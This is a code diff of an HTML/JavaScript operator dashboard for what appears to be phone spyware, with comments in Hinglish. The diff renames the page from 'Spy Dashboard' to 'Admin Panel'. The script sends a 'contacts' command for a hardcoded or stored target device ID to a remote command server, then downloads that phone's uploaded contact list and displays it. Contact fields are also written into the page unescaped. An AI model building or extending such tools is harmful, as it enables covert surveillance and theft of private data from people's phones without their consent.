@@ -3,19 +3,72 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Contacts - Spy Dashboard</title>
+    <title>Contacts - Admin Panel</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        :root { --bg-color: #0f0f0f; --text-main: #ffffff; --accent: #4caf50; }
-        body { background-color: var(--bg-color); color: var(--text-main); font-family: sans-serif; padding: 20px; }
+        :root {
+            --bg-color: #0f0f0f;
+            --glass-bg: #1a1a1a;
+            --text-main: #ffffff;
+            --accent: #4caf50;
+        }
+        body {
+            background-color: var(--bg-color);
+            color: var(--text-main);
+            font-family: 'Segoe UI', sans-serif;
+            margin: 0; padding: 20px;
+        }
         .container { max-width: 450px; margin: auto; }
-        .header { display: flex; align-items: center; margin-bottom: 20px; border-bottom: 1px solid #333; padding-bottom: 15px; }
-        .back-btn { color: white; margin-right: 15px; font-size: 1.2rem; }
-        .contact-card { background: #1a1a1a; padding: 15px; border-radius: 10px; margin-bottom: 10px; display: flex; align-items: center; border: 1px solid #333; }
-        .avatar { width: 40px; height: 40px; background: var(--accent); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-right: 15px; font-weight: bold; }
-        .info { flex: 1; }
-        .name { font-weight: bold; }
-        .number { color: #aaa; font-size: 0.9rem; }
+        
+        /* Header */
+        .header { 
+            display: flex; align-items: center; 
+            padding-bottom: 15px; border-bottom: 1px solid #333; margin-bottom: 20px;
+        }
+        .back-btn { 
+            color: white; font-size: 1.2rem; margin-right: 15px; 
+            text-decoration: none; padding: 5px;
+        }
+        .title-area h2 { margin: 0; font-size: 1.2rem; }
+        .device-tag { 
+            font-size: 0.7rem; background: #333; 
+            padding: 2px 8px; border-radius: 10px; color: var(--accent); 
+        }
+
+        /* Contact List */
+        .contact-list { display: flex; flex-direction: column; gap: 10px; }
+        
+        .contact-card {
+            background: var(--glass-bg);
+            padding: 15px; border-radius: 12px;
+            display: flex; align-items: center; justify-content: space-between;
+            border: 1px solid #333;
+        }
+        .contact-left { display: flex; align-items: center; gap: 15px; }
+        
+        .avatar {
+            width: 40px; height: 40px;
+            background: linear-gradient(135deg, #4caf50, #2e7d32);
+            border-radius: 50%;
+            display: flex; align-items: center; justify-content: center;
+            font-weight: bold; font-size: 1.1rem;
+        }
+        
+        .info h3 { margin: 0; font-size: 1rem; font-weight: 500; }
+        .info p { margin: 3px 0 0; font-size: 0.85rem; color: #aaa; }
+
+        .action-btn {
+            color: var(--accent); font-size: 1.2rem;
+            text-decoration: none; padding: 5px;
+        }
+
+        /* Loading & Error */
+        .status-msg { text-align: center; margin-top: 50px; color: #888; }
+        .refresh-btn {
+            background: var(--accent); color: white; border: none;
+            padding: 10px 20px; border-radius: 20px; margin-top: 15px;
+            cursor: pointer;
+        }
     </style>
 </head>
 <body>
@@ -23,84 +76,122 @@
     <div class="container">
         <div class="header">
             <a href="index.html" class="back-btn"><i class="fa-solid fa-arrow-left"></i></a>
-            <h2>Contacts List</h2>
+            <div class="title-area">
+                <h2>Contacts</h2>
+                <span class="device-tag" id="displayID">Connecting...</span>
+            </div>
         </div>
 
-        <div id="contactsContainer">
-            <div style="text-align: center; color: #666; margin-top: 50px;">
-                <i class="fas fa-spinner fa-spin"></i> Loading...
+        <div id="contactsContainer" class="contact-list">
+            <div class="status-msg">
+                <i class="fas fa-spinner fa-spin" style="font-size: 2rem;"></i>
+                <p>Requesting data from phone...</p>
             </div>
         </div>
     </div>
 
     <script>
-        // ⚠️ SABSE IMPORTANT CHANGE YAHAN HAI:
-        const RENDER_URL = "https://child-v9no.onrender.com"; 
-        const DEVICE_ID = "M2103K19I"; // <-- Yahan maine naam sahi kar diya hai
+        // --- SMART ID LOGIC ---
+        // 1. Index page se jo ID save ki thi, use uthao
+        let TARGET_ID = localStorage.getItem("TARGET_DEVICE_ID");
 
-        // Step 1: Pehle Command bhejo ki contacts upload kare
-        async function loadContacts() {
-            const container = document.getElementById("contactsContainer");
-            
+        // 2. Agar koi ID save nahi hai, to Logs wali ID use karo (Fallback)
+        if (!TARGET_ID || TARGET_ID === "Connecting...") {
+            TARGET_ID = "M2103K19I"; 
+        }
+
+        // Screen par ID dikhao
+        document.getElementById("displayID").innerText = TARGET_ID;
+
+        const RENDER_URL = "https://child-v9no.onrender.com";
+
+        // Step 1: Page khulte hi Command bhejo
+        async function init() {
             try {
-                // Command Bhejo
-                console.log("Sending command to phone...");
+                // Command bhejo: Phone ko bolo "Contacts upload karo"
+                console.log(`Sending command to ${TARGET_ID}...`);
                 await fetch(`${RENDER_URL}/api/send-command`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ device_id: DEVICE_ID, command: 'contacts' })
+                    body: JSON.stringify({ device_id: TARGET_ID, command: 'contacts' })
                 });
 
-                // Thoda wait karo taaki phone upload kar sake (3 seconds)
-                container.innerHTML = "<div style='text-align:center'>Command sent. Waiting for phone to upload...</div>";
-                setTimeout(fetchData, 4000); 
+                // User ko update do
+                const container = document.getElementById("contactsContainer");
+                container.innerHTML = `
+                    <div class="status-msg">
+                        <i class="fa-solid fa-satellite-dish"></i>
+                        <p>Command sent to ${TARGET_ID}.<br>Waiting for upload (5s)...</p>
+                    </div>
+                `;
+
+                // 5 Second ruk kar data fetch karo
+                setTimeout(fetchContacts, 5000);
 
             } catch (err) {
-                console.error(err);
-                container.innerHTML = "Error connecting to server.";
+                document.getElementById("contactsContainer").innerHTML = `
+                    <div class="status-msg" style="color:#ff4444">
+                        <p>Server Connection Failed.</p>
+                    </div>`;
             }
         }
 
-        // Step 2: Data Fetch karo
-        async function fetchData() {
+        // Step 2: Data download karke show karo
+        async function fetchContacts() {
             const container = document.getElementById("contactsContainer");
+            
             try {
-                // Log ke hisaab se tumhara server shayad is naam se file save kar raha hai:
-                // M2103K19I_contacts.json
-                // Isliye hum server se data mangenge:
-                
-                const response = await fetch(`${RENDER_URL}/api/get-data/${DEVICE_ID}/contacts`);
+                const response = await fetch(`${RENDER_URL}/api/get-data/${TARGET_ID}/contacts`);
                 const data = await response.json();
 
-                container.innerHTML = ""; 
-
-                if(!data || data.length === 0) {
-                    container.innerHTML = "<div style='text-align:center'>No contacts found. Try refreshing in 10 seconds.</div>";
+                // Agar data khali hai ya error hai
+                if (!data || data.length === 0 || data.error) {
+                    container.innerHTML = `
+                        <div class="status-msg">
+                            <p>No contacts received yet.</p>
+                            <button class="refresh-btn" onclick="location.reload()">Try Again</button>
+                        </div>
+                    `;
                     return;
                 }
 
+                // List banao
+                container.innerHTML = ""; // Purana loading hatao
+                
                 data.forEach(contact => {
-                    const initial = contact.name ? contact.name.charAt(0).toUpperCase() : "?";
-                    const card = `
+                    // Agar naam nahi hai toh "Unknown"
+                    const name = contact.name || "Unknown";
+                    const number = contact.number || "No Number";
+                    const initial = name.charAt(0).toUpperCase();
+
+                    const html = `
                         <div class="contact-card">
-                            <div class="avatar">${initial}</div>
-                            <div class="info">
-                                <div class="name">${contact.name || "Unknown"}</div>
-                                <div class="number">${contact.number || "No Number"}</div>
+                            <div class="contact-left">
+                                <div class="avatar">${initial}</div>
+                                <div class="info">
+                                    <h3>${name}</h3>
+                                    <p>${number}</p>
+                                </div>
                             </div>
-                            <i class="fa-solid fa-phone" style="color: #4caf50;"></i>
+                            <a href="tel:${number}" class="action-btn"><i class="fa-solid fa-phone"></i></a>
                         </div>
                     `;
-                    container.innerHTML += card;
+                    container.innerHTML += html;
                 });
-            } catch (err) {
-                console.log(err);
-                container.innerHTML = "<div style='text-align:center; color:#ff4444'>Data not received yet. <br> <button onclick='location.reload()' style='margin-top:10px; padding:5px 10px;'>Try Again</button></div>";
+
+            } catch (error) {
+                console.error(error);
+                container.innerHTML = `
+                    <div class="status-msg">
+                        <p>Data file not found yet.</p>
+                        <button class="refresh-btn" onclick="location.reload()">Refresh</button>
+                    </div>
+                `;
             }
         }
 
-        // Page khulte hi shuru karo
-        window.onload = loadContacts;
+        // Script chalao
+        window.onload = init;
     </script>
 </body>
 </html>
